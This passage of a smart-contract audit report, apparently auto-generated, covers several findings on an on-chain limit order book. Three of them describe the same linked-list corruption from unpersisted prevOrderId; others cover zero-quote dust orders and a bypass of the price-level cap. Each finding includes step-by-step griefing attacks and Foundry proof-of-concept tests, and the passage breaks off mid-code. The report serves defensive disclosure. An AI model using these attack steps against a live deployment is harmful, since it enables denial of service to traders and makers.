BookLib._updateLimitPostOrder / _updateLimitRemoveOrder

## Finding Status: Valid
### Finding Status Justification: The finding is mechanically proven by BookLib. _updateBookPostOrder stores the Order before _updateLimitPostOrder sets the appended order prevOrderId, and the later memory update is not written back to self.orders. Cancelling the appended order therefore makes _updateLimitRemoveOrder operate with prev and next both zero while numOrders was greater than one. The tree price remains, numOrders remains positive, and head/tail are cleared. Matching then encounters a null order at the best price. There is no complete safeguard, and the attacker only needs normal maker permissions for its own orders.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When appending an order to a non-empty limit, BookLib stores self.orders[order.id] before assigning order.prevOrderId in memory. The stored appended order therefore keeps prevOrderId == 0. Later, removing that appended tail makes _updateLimitRemoveOrder treat it as the head and set headOrder and tailOrder to zero while numOrders remains positive and the price remains in the tree. Vulnerable snippet: self.orders[order.id] = order; then tailOrder.nextOrderId = order.id; order.prevOrderId = tailOrder.id; limit.tailOrder = order.id; the updated prevOrderId is never written back to self.orders[order.id].

## Impact
An attacker can leave a populated best bid or ask price with a null head. Crossing fills then load order id 0, produce baseDelta == 0, break matching, and can revert as ZeroCostTrade/FOKOrderNotFilled even though the tree still points to that best price. This can cheaply DoS one side of a market until the remaining maker manually cancels the inaccessible order; there is no admin cancel path.

## Proof of Concept
1. Attacker or any maker posts two orders at the same price and side. 2. The second order is appended with stored prevOrderId == 0. 3. The appended order is cancelled. 4. _updateLimitRemoveOrder decrements numOrders but sets the limit head and tail to 0. 5. The price remains in the red-black tree with numOrders > 0, so future crossing orders repeatedly see the stale best price and cannot match live liquidity behind the corrupted limit.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {Book, BookLib, CLOBStorageLib, Limit, MarketConfig, MarketSettings} from "contracts/clob/types/Book.sol";
import {Order, OrderId, OrderIdLib, Side} from "contracts/clob/types/Order.sol";
contract BookHarness {
    using BookLib for Book;
    using CLOBStorageLib for Book;
    using OrderIdLib for uint256;
    Book internal book;
    constructor() {
        book.init(MarketConfig({quoteToken: address(0x1001), baseToken: address(0x1002), quoteSize: 1e18, baseSize: 1e18}), MarketSettings({status: true, maxLimitsPerTx: 10, minLimitOrderAmountInBase: 100, tickSize: 1, lotSizeInBase: 1}));
    }
    function post(uint256 id) external {
        Order memory o;
        o.side = Side.SELL;
        o.id = id.toOrderId();
        o.owner = msg.sender;
        o.price = 1e18;
        o.amount = 100;
        book.addOrderToBook(o);
    }
    function remove(uint256 id) external {
        Order storage o = book.orders[id.toOrderId()];
        book.removeOrderFromBook(o);
    }
    function limit() external view returns (Limit memory) { return book.getLimit(1e18, Side.SELL); }
    function orderOf(uint256 id) external view returns (Order memory) { return book.orders[id.toOrderId()]; }
}
contract BookLimitCorruptionPoC is Test {
    using OrderIdLib for OrderId;
    function testCancelingAppendedOrderNullsHeadWhileLimitRemainsPopulated() public {
        BookHarness h = new BookHarness();
        h.post(1);
        h.post(2);
        Order memory second = h.orderOf(2);
        assertEq(second.prevOrderId.unwrap(), 0);
        h.remove(2);
        Limit memory l = h.limit();
        assertEq(l.numOrders, 1);
        assertEq(l.headOrder.unwrap(), 0);
        assertEq(l.tailOrder.unwrap(), 0);
        assertEq(h.orderOf(1).owner, address(this));
    }
}

## Suggested Mitigation
Set order.prevOrderId before writing the appended order to storage, or explicitly write self.orders[order.id].prevOrderId = tailOrder.id after appending. Add invariant tests that populated limits always have nonzero head/tail and a traversal count equal to numOrders.
```

### M-22 / `Y8bBwzzHDvU11PZtarwlE`
- Finding title: Tail-order cancellation corrupts CLOB price-level queue and blocks matching at that price
- Report lines: 2288-2332
```md
## [M-22]. Tail-order cancellation corrupts CLOB price-level queue and blocks matching at that price

## id: Y8bBwzzHDvU11PZtarwlE

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
Dos

## Location
CLOB / BookLib.cancel / removeOrderFromBook

## Finding Status: Valid
### Finding Status Justification: The vulnerable ordering is directly present: self.orders[order.id] = order occurs before order.prevOrderId = tailOrder.id, and that later assignment is not written to storage. A permissionless account can append at an existing price and cancel the appended order. Removal treats the stored tail as a head and leaves numOrders positive while headOrder and tailOrder become zero. The price remains in the red-black tree and matching reads a null maker order, causing zero-fill behavior and ZeroCostTrade. The code contains no complete linked-list integrity check or repair.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When a second order is appended at an existing price, BookLib stores the order before assigning its prevOrderId. The storage copy therefore keeps prevOrderId == 0. If that appended tail order is later cancelled, _updateLimitRemoveOrder treats it as the head and sets both headOrder and tailOrder to zero while limit.numOrders remains nonzero and the real head order remains locked in orders. Vulnerable snippet: self.orders[order.id] = order; ... tailOrder.nextOrderId = order.id; order.prevOrderId = tailOrder.id; limit.tailOrder = order.id;. Because the prev update is only made to memory after storage insertion, cancellation of the tail poisons the limit and postFillOrder can no longer reach live liquidity at the best price.

## Impact
A permissionless maker can grief another maker's resting order at the same price, causing fills against that best price to revert with ZeroCostTrade and forcing the victim to cancel and repost, losing priority and temporarily locking liquidity. Repeating this at top-of-book price levels can deny normal trading for the market side.

## Proof of Concept
1. Victim posts an ask at price P, becoming the head. 2. Attacker posts a smaller ask at the same price P, becoming the tail but with stored prevOrderId == 0. 3. Attacker cancels only their tail order. 4. The limit keeps numOrders == 1 but headOrder == tailOrder == 0 while the victim order still exists. 5. A buyer posting a fill crossing P reverts because matching reads order 0 and returns zero fill.

## Proof of Code
// Add to test/CLOBTailCancelQueuePoison.t.sol
pragma solidity 0.8.27;
import "forge-std/Test.sol";
import {BeaconProxy} from "@openzeppelin/proxy/beacon/BeaconProxy.sol";
import {CLOB, MarketConfig, MarketSettings, Limit} from "contracts/clob/CLOB.sol";
import {ICLOB, Side} from "contracts/clob/ICLOB.sol";
import {OrderId} from "contracts/clob/types/Order.sol";
contract StaticBeacon { address public immutable implementation; constructor(address i){implementation=i;} }
contract MockFactory { mapping(address=>bool) public exempt; function setExempt(address a,bool b) external {exempt[a]=b;} function getMaxLimitExempt(address a) external view returns(bool){return exempt[a];} }
contract MockAccountManager { function getOperatorRoleApprovals(address,address) external pure returns(uint256){return 0;} function settleIncomingOrder(ICLOB.SettleParams calldata) external pure returns(uint256){return 0;} function creditAccount(address,address,uint256) external {} function creditAccountNoEvent(address,address,uint256) external {} function debitAccount(address,address,uint256) external {} }
contract CLOBTailCancelQueuePoisonTest is Test { CLOB clob; MockFactory factory; function setUp() public { factory = new MockFactory(); MockAccountManager am = new MockAccountManager(); CLOB impl = new CLOB(address(factory), address(0xbeef), address(am), 1_000_000); StaticBeacon beacon = new StaticBeacon(address(impl)); bytes memory init = abi.encodeWithSelector(CLOB.initialize.selector, MarketConfig(address(0x100), address(0x200), 1e18, 1e18), MarketSettings(true, 255, 100, 1, 1), address(this)); clob = CLOB(address(new BeaconProxy(address(beacon), init))); } function _ask(address maker,uint256 amt) internal returns(uint256) { vm.prank(maker); return clob.postLimitOrder(maker, ICLOB.PostLimitOrderArgs(amt, 1e18, 0, Side.SELL, 0, ICLOB.LimitOrderType.POST_ONLY)).orderId; } function test_tailCancelPoisonsLimitAndBlocksFill() public { address victim = address(0xA11CE); address attacker = address(0xB0B); address buyer = address(0xCAFE); uint256 victimId = _ask(victim, 1000); uint256 attackerId = _ask(attacker, 100); uint256[] memory ids = new uint256[](1); ids[0] = attackerId; vm.prank(attacker); clob.cancel(attacker, ICLOB.CancelArgs(ids)); Limit memory lim = clob.getLimit(1e18, Side.SELL); assertEq(lim.numOrders, 1); assertEq(OrderId.unwrap(lim.headOrder), 0); assertEq(clob.getOrder(victimId).owner, victim); vm.expectRevert(bytes4(keccak256("ZeroCostTrade()"))); vm.prank(buyer); clob.postFillOrder(buyer, ICLOB.PostFillOrderArgs(100, 1e18, Side.BUY, true, ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL)); } }

## Suggested Mitigation
Store the finalized linked-list pointers before writing the new order to storage, or update self.orders[order.id].prevOrderId after assigning order.prevOrderId. Add invariant tests for head/tail/middle cancellation at multi-order limits.
```

### M-23 / `9DMzwZBvN1i2QQTvRs_0Q`
- Finding title: Zero-quote dust orders can permanently block one side of a CLOB market
- Report lines: 2333-2397
```md
## [M-23]. Zero-quote dust orders can permanently block one side of a CLOB market

## id: 9DMzwZBvN1i2QQTvRs_0Q

## Derived From Pattern/Invariant
PricePrecisionOrRoundingError

## Exploit Type
RoundingError

## Location
CLOB._matchIncomingOrder

## Finding Status: Valid
### Finding Status Justification: The described path exists in in-scope CLOB matching code. _matchIncomingOrder can partially fill a resting order, reduce makerOrder.amount, and leave a nonzero remainder below the original minimum. getQuoteTokenAmount floors baseAmount * price / baseSize, so a small remaining base amount at a low but valid price can produce quoteDelta == 0. Later matching can produce baseDelta > 0 with quoteDelta == 0, then _processFillBidOrder or limit processing reverts with ZeroCostTrade. The state mutation is reverted, so the dust order remains at the best price. There is no complete safeguard removing zero-notional remainders, and this is permissionless once market settings admit the price/amount geometry.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
CLOB allows partial fills to leave a resting order below minLimitOrderAmountInBase. At low valid prices, the remaining base dust can round to zero quote in getQuoteTokenAmount(). A later taker matches nonzero baseDelta but zero quoteDelta, so postFillOrder/postLimitOrder reverts with ZeroCostTrade. Because the revert rolls back the attempted removal, the dust order stays at the best price and blocks all crossing orders until its owner voluntarily cancels.

Vulnerable snippets:
matchData.quoteDelta = ds.getQuoteTokenAmount(matchedPrice, matchData.baseDelta);
...
if (orderRemoved) ds.removeOrderFromBook(makerOrder);
else makerOrder.amount -= matchData.baseDelta;

and then:
if (totalQuoteSent == 0 || totalBaseReceived == 0) revert ZeroCostTrade();

The code never removes or cancels the sub-minimum remainder when a partial fill leaves an amount whose quote value floors to zero.

## Impact
A maker can lock a one-sided best-price dust order that prevents takers from buying or selling through that price. This is a functional market DoS; funds are not directly stolen, but valid liquidity behind the dust cannot be reached by normal matching.

## Proof of Concept
1. In a valid market with baseSize = 1e18, tickSize = 1e16, minLimitOrderAmountInBase = 100, and lotSizeInBase = 1, the attacker posts an ask for 101 base units at price 1e16.
2. An accomplice buys exactly 100 base units, paying floor(100 * 1e16 / 1e18) = 1 quote unit, leaving 1 base unit on the ask.
3. The remaining 1 base unit has quote value floor(1 * 1e16 / 1e18) = 0.
4. Every later buy that reaches this best ask attempts to remove it, computes totalBaseReceived = 1 and totalQuoteSent = 0, and reverts with ZeroCostTrade.
5. The revert restores the dust ask, so the market remains blocked until the attacker cancels.

## Proof of Code
function testZeroQuoteDustAskBlocksBuys() public {
    CLOB clob = _deployClob(100, 1, 1e16);
    address attacker = address(0xA11CE);
    address buyer = address(0xB0B);
    address victim = address(0xCAFE);
    ICLOB.PostLimitOrderArgs memory ask = ICLOB.PostLimitOrderArgs({amountInBase: 101, price: 1e16, cancelTimestamp: 0, side: Side.SELL, clientOrderId: 0, limitOrderType: ICLOB.LimitOrderType.POST_ONLY});
    vm.prank(attacker); clob.postLimitOrder(attacker, ask);
    ICLOB.PostFillOrderArgs memory fill100 = ICLOB.PostFillOrderArgs({amount: 100, priceLimit: 1e16, side: Side.BUY, amountIsBase: true, fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL});
    vm.prank(buyer); clob.postFillOrder(buyer, fill100);
    assertEq(clob.getOrder(1).amount, 1);
    ICLOB.PostFillOrderArgs memory blocked = ICLOB.PostFillOrderArgs({amount: 100, priceLimit: 1e16, side: Side.BUY, amountIsBase: true, fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL});
    vm.prank(victim);
    vm.expectRevert(CLOB.ZeroCostTrade.selector);
    clob.postFillOrder(victim, blocked);
    assertEq(clob.getOrder(1).amount, 1);
}

## Suggested Mitigation
When a partial fill would leave an order below the minimum amount or with zero quote/base value at its price, remove the remainder and refund it to the maker instead of leaving it on the book. Also require matched quoteDelta and baseDelta to both be nonzero before mutating book state.
```

### M-24 / `2Cf1SI_P2vh8pQZjuiEjt`
- Finding title: Canceling an appended order corrupts CLOB price-level pointers and blocks matching at that price
- Report lines: 2398-2454
```md
## [M-24]. Canceling an appended order corrupts CLOB price-level pointers and blocks matching at that price

## id: 2Cf1SI_P2vh8pQZjuiEjt

## Derived From Pattern/Invariant
AccountingInvariantViolation: limit linked-list count must equal live orders

## Exploit Type
AccountingInvariantViolation

## Location
BookLib.addOrderToBook/removeOrderFromBook

## Finding Status: Valid
### Finding Status Justification: The finding accurately describes the in-scope code. _updateBookPostOrder writes the order into self.orders before _updateLimitPostOrder mutates order.prevOrderId. Because the mutation is on memory, the stored tail has prevOrderId == 0. On cancellation, _updateLimitRemoveOrder sees prev and next as null and zeroes the limit's head and tail while an older same-price order remains. Matching at that price loads order id zero and fails to reach the live order. No existing check or pagination logic mitigates the corrupted linked list.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
BookLib stores a newly appended order before setting its prevOrderId. The later memory write is not persisted:

function _updateBookPostOrder(...) private returns (Limit storage limit) { ... self.orders[order.id] = order; }
function _updateLimitPostOrder(...) private { ... Order storage tailOrder = self.orders[limit.tailOrder]; tailOrder.nextOrderId = order.id; order.prevOrderId = tailOrder.id; limit.tailOrder = order.id; }

When the appended tail is removed, storage still has prevOrderId == 0. _updateLimitRemoveOrder treats it as the head and sets both headOrder and tailOrder to zero while limit.numOrders remains nonzero. A victim order at the same price remains in orders and open interest but becomes unreachable for matching; if that price is top-of-book, fills revert with ZeroCostTrade until the orphaned maker cancels.

## Impact
Permissionless griefing of makers and takers. An attacker can append behind a victim at the best price, cancel the attacker order, and leave the price level with numOrders > 0 but no head/tail pointer. Marketable orders crossing that price cannot execute, so trading on that side is unavailable until the orphaned maker manually cancels.

## Proof of Concept
1. Victim posts a sell order at the best ask.
2. Attacker posts a second sell order at the same price, becoming the tail.
3. Attacker cancels only the tail order.
4. Because the tail order had prevOrderId == 0 in storage, the limit becomes numOrders == 1 with headOrder == tailOrder == 0.
5. A buyer submits a fill order crossing the best ask; matching reads orders[0], produces zero fill, and reverts with ZeroCostTrade while the victim order still exists.

## Proof of Code
pragma solidity 0.8.27;
import 'forge-std/Test.sol';
import {CLOB} from 'contracts/clob/CLOB.sol';
import {ICLOB, Side} from 'contracts/clob/ICLOB.sol';
import {MarketConfig, MarketSettings, Limit} from 'contracts/clob/types/Book.sol';
import {OrderId, OrderIdLib} from 'contracts/clob/types/Order.sol';
import {BeaconProxy} from '@openzeppelin/proxy/beacon/BeaconProxy.sol';
import {UpgradeableBeacon} from '@openzeppelin/proxy/beacon/UpgradeableBeacon.sol';

contract MockFactory { function getMaxLimitExempt(address) external pure returns (bool) { return false; } }
contract MockAccountManager { uint256 public lastMakerCredits; function settleIncomingOrder(ICLOB.SettleParams calldata params) external returns (uint256) { lastMakerCredits = params.makerCredits.length; return 0; } function creditAccount(address,address,uint256) external {} function creditAccountNoEvent(address,address,uint256) external {} function debitAccount(address,address,uint256) external {} }

contract CLOBBookPoC is Test { using OrderIdLib for OrderId; MockAccountManager internal am; function _deploy() internal returns (CLOB market) { MockFactory factory = new MockFactory(); am = new MockAccountManager(); CLOB impl = new CLOB(address(factory), address(0), address(am), 1000); UpgradeableBeacon beacon = new UpgradeableBeacon(address(impl), address(this)); bytes memory init = abi.encodeWithSelector(CLOB.initialize.selector, MarketConfig({quoteToken: address(0x100), baseToken: address(0x200), quoteSize: 1e18, baseSize: 1e18}), MarketSettings({status: true, maxLimitsPerTx: type(uint8).max, minLimitOrderAmountInBase: 100, tickSize: 1, lotSizeInBase: 1}), address(this)); market = CLOB(address(new BeaconProxy(address(beacon), init))); } function _postSell(CLOB market, address user, uint256 amount) internal returns (uint256) { vm.prank(user); ICLOB.PostLimitOrderResult memory r = market.postLimitOrder(user, ICLOB.PostLimitOrderArgs({amountInBase: amount, price: 1e18, cancelTimestamp: 0, side: Side.SELL, clientOrderId: 0, limitOrderType: ICLOB.LimitOrderType.POST_ONLY})); return r.orderId; } function _fillBuy(CLOB market, address user, uint256 amount) internal { vm.prank(user); market.postFillOrder(user, ICLOB.PostFillOrderArgs({amount: amount, priceLimit: 1e18, side: Side.BUY, amountIsBase: true, fillOrderType: ICLOB.FillOrderType.IMMEDIATE_OR_CANCEL})); } function testCancelingAppendedTailCorruptsBestAsk() public { CLOB market = _deploy(); address victim = address(0xA11CE); address attacker = address(0xB0B); uint256 victimId = _postSell(market, victim, 100); uint256 attackerId = _postSell(market, attacker, 100); uint256[] memory ids = new uint256[](1); ids[0] = attackerId; vm.prank(attacker); market.cancel(attacker, ICLOB.CancelArgs({orderIds: ids})); Limit memory lim = market.getLimit(1e18, Side.SELL); assertEq(lim.numOrders, 1); assertEq(lim.headOrder.unwrap(), 0); assertEq(lim.tailOrder.unwrap(), 0); assertEq(market.getOrder(victimId).owner, victim); vm.expectRevert(CLOB.ZeroCostTrade.selector); _fillBuy(market, address(0xCAFE), 100); } }


## Suggested Mitigation
Persist prevOrderId before storing the new order, or write it back to storage after updating the tail. For example, set order.prevOrderId before self.orders[order.id] = order when appending, or assign self.orders[order.id].prevOrderId = tailOrder.id after the storage write. Add invariant tests that walking head/tail reaches exactly limit.numOrders after canceling head, middle, and tail orders.
```

### M-25 / `RdhlzdOHuMq96aCAhrX5A`
- Finding title: Non-competitive eviction can bypass maxNumLimitsPerSide and allow unbounded price-level growth
- Report lines: 2455-2520
```md
## [M-25]. Non-competitive eviction can bypass maxNumLimitsPerSide and allow unbounded price-level growth

## id: RdhlzdOHuMq96aCAhrX5A

## Derived From Pattern/Invariant
UnboundedLoops

## Exploit Type
GasGriefBlockLimit

## Location
CLOB._executeBidLimitOrder/_executeAskLimitOrder

## Finding Status: Valid
### Finding Status Justification: The eviction logic exists in _executeBidLimitOrder and _executeAskLimitOrder. When tree.size() equals maxNumLimitsPerSide, the code removes only ds.orders[worstLimit.tailOrder]. If that worst limit has multiple orders, BookLib.removeOrderFromBook decrements limit.numOrders but does not remove the price from the red-black tree. The new price is then inserted, increasing tree size above the cap. Later checks use equality, not >=, so pruning is skipped once size is greater than the maximum. This is in-scope, permissionless through normal order posting, and has no complete guard.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When the book has exactly `maxNumLimitsPerSide` price levels, CLOB evicts only the tail order at the worst price before inserting a more competitive order: `if (ds.bidTree.size() == maxNumLimitsPerSide) { uint256 minBidPrice = ds.getWorstBidPrice(); ... _removeNonCompetitiveOrder(ds, ds.orders[ds.bidLimits[minBidPrice].tailOrder]); } ds.addOrderToBook(newOrder);`. If the worst price has more than one order, removing one order does not remove the price from the red-black tree. The new price is then inserted, making the tree size `maxNumLimitsPerSide + 1`. Future inserts skip eviction entirely because the guard is `== maxNumLimitsPerSide` instead of `>= maxNumLimitsPerSide`, so price levels can grow without the intended cap.

## Impact
The core anti-flooding invariant is bypassed. Attackers can grow the number of price levels beyond the configured maximum, increasing storage and traversal costs and making matching/pagination paths increasingly expensive or unusable.

## Proof of Concept
1. Fill one side of the book to `maxNumLimitsPerSide` unique prices. 2. Add a second order at the current worst price. 3. Submit a more competitive order at a new price. 4. CLOB removes only one order from the worst price, leaves that price in the tree, and inserts the new price. 5. The tree now exceeds the cap; subsequent inserts no longer evict because `size() == maxNumLimitsPerSide` is false.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CLOBTestBase} from "test/clob/utils/CLOBTestBase.sol";
import {Side} from "contracts/clob/types/Order.sol";

contract MaxLimitsBypassPoC is CLOBTestBase {
    function test_EvictionLeavesWorstPriceAndBypassesPriceLevelCap() public {
        address attacker = users[0];
        uint256 amount = 1 ether;
        uint256 startPrice = 1 ether;

        for (uint256 i; i < MAX_NUM_LIMITS_PER_SIDE; ++i) {
            setupOrder(Side.BUY, attacker, amount, startPrice + i * TICK_SIZE);
        }

        setupOrder(Side.BUY, attacker, amount, startPrice);
        setupOrder(Side.BUY, attacker, amount, startPrice + MAX_NUM_LIMITS_PER_SIDE * TICK_SIZE);

        (uint256 bestBid,) = clob.getTOB();
        uint256 price = bestBid;
        uint256 priceLevels;
        while (price != 0) {
            ++priceLevels;
            price = clob.getNextSmallestPrice(price, Side.BUY);
        }

        assertGt(priceLevels, MAX_NUM_LIMITS_PER_SIDE, "price-level cap was bypassed");
        assertGt(clob.getLimit(startPrice, Side.BUY).numOrders, 0, "old worst price still exists");
        assertEq(clob.getLimit(startPrice + MAX_NUM_LIMITS_PER_SIDE * TICK_SIZE, Side.BUY).numOrders, 1, "new price was inserted");
    }
}

## Suggested Mitigation
Evict an entire worst price level before inserting a new price, or loop until the tree size is below the cap. Use `>= maxNumLimitsPerSide` as a defensive guard, and add tests where the worst price contains multiple orders.
```

### M-27 / `WSYqCqHZyebvGG35AyqJv`
- Finding title: Full-book pruning removes one order instead of a price level, allowing price levels to exceed maxNumLimitsPerSide
- Report lines: 2635-2669
```md
## [M-27]. Full-book pruning removes one order instead of a price level, allowing price levels to exceed maxNumLimitsPerSide

## id: WSYqCqHZyebvGG35AyqJv

## Derived From Pattern/Invariant
StateGrowthOrStorageBloat

## Exploit Type
GasGriefBlockLimit

## Location
CLOB._executeAskLimitOrder

## Finding Status: Valid
### Finding Status Justification: Both _executeAskLimitOrder and _executeBidLimitOrder evict only the tail order at the worst price when tree.size() == maxNumLimitsPerSide. If that price has more than one order, BookLib removal decrements numOrders and leaves the price in the tree. The incoming new price is inserted, so the number of price levels exceeds the immutable cap. Future insertions skip eviction because the guard is equality instead of >=. The path is normal permissionless order posting in in-scope code, with no complete safeguard.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When a side of the book is full, _executeAskLimitOrder and _executeBidLimitOrder call _removeNonCompetitiveOrder on only the tail order at the worst price. If that worst price has more than one order, removing a single order does not remove the price from the red-black tree, so tree.size() remains maxNumLimitsPerSide. The incoming order is then inserted at a new price, increasing tree size above the configured cap. Future placements check if tree.size() == maxNumLimitsPerSide, not >=, so once the cap is exceeded pruning is skipped entirely.

## Impact
The intended bound on unique price levels can be bypassed. An attacker can grow book state beyond the configured maximum, increasing traversal/storage costs and undermining the protocol's order-flooding protection.

## Proof of Concept
1. Configure maxNumLimitsPerSide = 2. 2. Attacker fills the ask tree with prices 10 and 20, then adds a second order at worst ask price 20. 3. Attacker posts a more competitive ask at price 5. The contract removes only one order at price 20, leaves price 20 in the tree, and inserts price 5, producing 3 price levels. 4. Because size is now greater than max, later new prices skip the equality check and can keep growing the tree.

## Proof of Code
function test_fullBookSingleOrderPruneBypassesPriceLevelCap() public { ICLOB clob = deployClob(2, 100); vm.prank(address(1)); clob.postLimitOrder(address(1), limitArgs(100, 10, 0, Side.SELL, ICLOB.LimitOrderType.POST_ONLY)); vm.prank(address(2)); clob.postLimitOrder(address(2), limitArgs(100, 20, 0, Side.SELL, ICLOB.LimitOrderType.POST_ONLY)); vm.prank(address(3)); clob.postLimitOrder(address(3), limitArgs(100, 20, 0, Side.SELL, ICLOB.LimitOrderType.POST_ONLY)); vm.prank(address(4)); clob.postLimitOrder(address(4), limitArgs(100, 5, 0, Side.SELL, ICLOB.LimitOrderType.POST_ONLY)); assertEq(clob.getNextBiggestPrice(5, Side.SELL), 10); assertEq(clob.getNextBiggestPrice(10, Side.SELL), 20); vm.prank(address(5)); clob.postLimitOrder(address(5), limitArgs(100, 4, 0, Side.SELL, ICLOB.LimitOrderType.POST_ONLY)); assertEq(clob.getNextBiggestPrice(4, Side.SELL), 5); }

## Suggested Mitigation
When the book is full, remove the entire worst price level or keep removing orders at that price until the price node is deleted before inserting a new price. Also change the guard to tree.size() >= maxNumLimitsPerSide and add tests where the worst limit contains multiple orders.
```

### L-28 / `zEdopivUepNxTT_LKsrN7`
- Finding title: Same-price amend ignores new cancelTimestamp so orders expire earlier than the successful amend specifies
- Report lines: 2670-2738
```md
## [L-28]. Same-price amend ignores new cancelTimestamp so orders expire earlier than the successful amend specifies

## id: zEdopivUepNxTT_LKsrN7

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
TimestampDependentLogic

## Location
CLOB._executeAmendAmount

## Finding Status: Valid
### Finding Status Justification: _processAmend validates args.cancelTimestamp and emits OrderAmended with the full args. But when side and price are unchanged it calls _executeAmendAmount(ds, order, args.amountInBase), and _executeAmendAmount only updates order.amount and open interest. It never writes order.cancelTimestamp. Therefore a same-price amend can succeed while storage keeps the old expiry, causing later matching to remove the order as expired. This is an in-scope permissionless maker path and not protected by any safeguard.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`_processAmend` validates the requested `args.cancelTimestamp`, and `OrderAmended` emits the new timestamp, but the same-side same-price path only updates amount:

`(quoteTokenDelta, baseTokenDelta) = _executeAmendAmount(ds, order, args.amountInBase);`

`_executeAmendAmount` ends with only:

`order.amount = amount;`

It never writes `order.cancelTimestamp = args.cancelTimestamp`. A maker who amends only amount while extending expiry, or changing expiry to the no-expiry sentinel `0`, receives a successful amend event but storage keeps the old expiry.

## Impact
Resting liquidity can expire and be removed earlier than the maker's successful amend requested. This can cause missed fills and misleading off-chain state because the event reports the new timestamp while the order remains governed by the old one. Funds are refunded on expiry, so the impact is functional rather than direct theft.

## Proof of Concept
1. Maker posts a sell order with `cancelTimestamp = block.timestamp + 1 hours`.
2. Maker amends the order at the same price and side, changing only amount and setting `cancelTimestamp = 0` or a later timestamp.
3. The amend succeeds and emits the requested timestamp.
4. `getOrder(orderId).cancelTimestamp` still equals the old timestamp.
5. After the old timestamp passes, the next taker match treats the order as expired and removes it instead of filling it.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {CLOBTestBase} from "test/clob/utils/CLOBTestBase.sol";
import {ICLOB, Side} from "contracts/clob/ICLOB.sol";

contract AmendTimestampPOC is CLOBTestBase {
    function test_samePriceAmendDoesNotPersistNewCancelTimestamp() public {
        address maker = makeAddr("maker");
        _mintAndDepositBase(maker, 1_000);

        uint32 oldExpiry = uint32(block.timestamp + 1 hours);
        vm.prank(maker);
        clob.postLimitOrder(maker, ICLOB.PostLimitOrderArgs({amountInBase: 200, price: 2, cancelTimestamp: oldExpiry, side: Side.SELL, clientOrderId: 0, limitOrderType: ICLOB.LimitOrderType.POST_ONLY}));
        uint256 orderId = clob.getNextOrderId() - 1;

        vm.prank(maker);
        clob.amend(maker, ICLOB.AmendArgs({orderId: orderId, amountInBase: 300, price: 2, cancelTimestamp: 0, side: Side.SELL, limitOrderType: ICLOB.LimitOrderType.POST_ONLY}));

        assertEq(clob.getOrder(orderId).amount, 300, "amount was amended");
        assertEq(clob.getOrder(orderId).cancelTimestamp, oldExpiry, "new no-expiry timestamp was not persisted");
    }
}

## Suggested Mitigation
Pass the requested timestamp into `_executeAmendAmount` and set `order.cancelTimestamp = uint32(args.cancelTimestamp)` on the same-side same-price path. Add tests for extending expiry and changing from a finite expiry to `0`.
```

### H-29 / `fc-HXKUWbDnoz-SIy46sV`
- Finding title: Same-price order append corrupts CLOB queue and can brick matching at the best price
- Report lines: 2739-2864
```md
## [H-29]. Same-price order append corrupts CLOB queue and can brick matching at the best price

## id: fc-HXKUWbDnoz-SIy46sV

## Derived From Pattern/Invariant
AccountingInvariantViolation / jExPQXC_1umqdQAJ6_s31 order-link invariant

## Exploit Type
AccountingInvariantViolation

## Location
BookLib / CLOB._updateLimitPostOrder / _updateLimitRemoveOrder / _matchIncomingBid / _matchIncomingAsk

## Finding Status: Valid
### Finding Status Justification:
### Finding Complexity: 4
## Minimim Privilege Required:Permissionless


## Description
When appending an order to an existing price level, BookLib stores the order before setting its prevOrderId. _updateBookPostOrder writes self.orders[order.id] = order, then _updateLimitPostOrder mutates only the memory copy by setting order.prevOrderId = tailOrder.id. The stored appended order keeps prevOrderId == 0.

Vulnerable snippets:

function addOrderToBook(Book storage self, Order memory order) internal {
    Limit storage limit = _updateBookPostOrder(self, order);
    _updateLimitPostOrder(self, limit, order);
}

function _updateBookPostOrder(Book storage self, Order memory order) private returns (Limit storage limit) {
    ...
    self.orders[order.id] = order;
}

function _updateLimitPostOrder(Book storage self, Limit storage limit, Order memory order) private {
    limit.numOrders++;
    if (limit.headOrder.isNull()) { ... }
    else {
        Order storage tailOrder = self.orders[limit.tailOrder];
        tailOrder.nextOrderId = order.id;
        order.prevOrderId = tailOrder.id;
        limit.tailOrder = order.id;
    }
}

When the appended tail is later cancelled/amended/removed, _updateLimitRemoveOrder sees prevOrderId == 0 and treats it as the head. For a two-order price level where the tail has no next order, this sets both headOrder and tailOrder to zero while numOrders remains positive and the price remains in the red-black tree. Later crossing orders read the stale best price, load order 0, get baseDelta == 0, and break without matching real liquidity left at that price.

## Impact
An unprivileged maker can corrupt the best bid or ask queue at a populated price level. Crossing FOK/IOC taker orders can revert with ZeroCostTrade or stop without consuming available liquidity, causing denial of service for trading at the top of book and stranding makers' resting orders/accounting at that price.

## Proof of Concept
1. Maker A posts an ask at price P.
2. Maker B posts another ask at the same price P; the stored second order has prevOrderId == 0.
3. Maker B cancels the second order.
4. _updateLimitRemoveOrder treats the second order as the head and sets the limit head/tail to zero while numOrders remains 1 and P remains in the ask tree.
5. A taker submits a crossing bid.
6. Matching reads askLimits[P].headOrder == 0, loads the null order, computes baseDelta == 0, breaks, and the fill reverts or fails to consume Maker A's real order.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {CLOB} from "contracts/clob/CLOB.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {Side} from "contracts/clob/types/Order.sol";
import {MarketConfig, MarketSettings, Limit} from "contracts/clob/types/Book.sol";

contract MockOperator {
    function getOperatorRoleApprovals(address, address) external pure returns (uint256) { return type(uint256).max; }
}

contract MockAccountManager is MockOperator {
    function settleIncomingOrder(ICLOB.SettleParams calldata) external pure returns (uint256) { return 0; }
